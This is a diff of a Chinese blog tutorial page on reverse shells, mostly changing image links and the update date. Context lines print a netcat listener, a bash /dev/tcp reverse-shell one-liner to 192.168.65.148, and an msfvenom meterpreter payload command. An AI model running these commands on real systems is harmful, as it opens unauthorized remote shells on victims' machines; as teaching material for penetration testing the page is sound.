@@ -222,19 +222,19 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>攻击机开启端口监听</span><br><span class="line">nc -lvp 9999</span><br><span class="line"><span class="meta">#</span>nc指的是netcat</span><br><span class="line"><span class="meta">#</span>-l 是listen监听的作用</span><br><span class="line"><span class="meta">#</span>-v 用于输出交互的信息</span><br><span class="line"><span class="meta">#</span>-p 用于监听指定端口</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <a rel=反弹Shell href="/img/%E5%8F%8D%E5%BC%B9shell/1609514196672.png" title="1609514196672" data-fancybox="images"><img src="/img/%E5%8F%8D%E5%BC%B9shell/1609514196672.png" alt="1609514196672" title class></a>
+                <a rel=反弹Shell href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514196672.png" title="1609514196672" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514196672.png" alt="1609514196672" title class></a>
                 <p>1609514196672</p>
             </figure>
 
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>受害机执行反弹命令(自动连接监听的端口)</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span>bash -i 用于产生一个交互的shell</span><br><span class="line"><span class="meta">#</span>/dev/tcp/ip/port 作用相当于建立一个sockt连接</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <a rel=反弹Shell href="/img/%E5%8F%8D%E5%BC%B9shell/1609514612069.png" title="1609514612069" data-fancybox="images"><img src="/img/%E5%8F%8D%E5%BC%B9shell/1609514612069.png" alt="1609514612069" title class></a>
+                <a rel=反弹Shell href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609518776337.png" title="1609514612069" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609518776337.png" alt="1609514612069" title class></a>
                 <p>1609514612069</p>
             </figure>
 
 <figure class="image-box">
-                <a rel=反弹Shell href="/img/%E5%8F%8D%E5%BC%B9shell/1609514726946.png" title="1609514726946" data-fancybox="images"><img src="/img/%E5%8F%8D%E5%BC%B9shell/1609514726946.png" alt="1609514726946" title class></a>
+                <a rel=反弹Shell href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514726946.png" title="1609514726946" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514726946.png" alt="1609514726946" title class></a>
                 <p>1609514726946</p>
             </figure>
 
@@ -276,7 +276,7 @@
 <h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.65.148 LPORT=9999 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
 
 <h3 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h3><figure class="image-box">
-                <a rel=反弹Shell href="/img/%E5%8F%8D%E5%BC%B9shell/1609518776337.png" title="1609518776337" data-fancybox="images"><img src="/img/%E5%8F%8D%E5%BC%B9shell/1609518776337.png" alt="1609518776337" title class></a>
+                <a rel=反弹Shell href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514612069.png" title="1609518776337" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514612069.png" alt="1609518776337" title class></a>
                 <p>1609518776337</p>
             </figure>
 
@@ -292,7 +292,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2021-01-24T06:57:34.624Z" itemprop="dateUpdated">2021-01-24 14:57:34</time>
+    最後更新時間：<time datetime="2021-02-27T12:29:01.999Z" itemprop="dateUpdated">2021-02-27 20:29:01</time>
 </span><br>
 
 
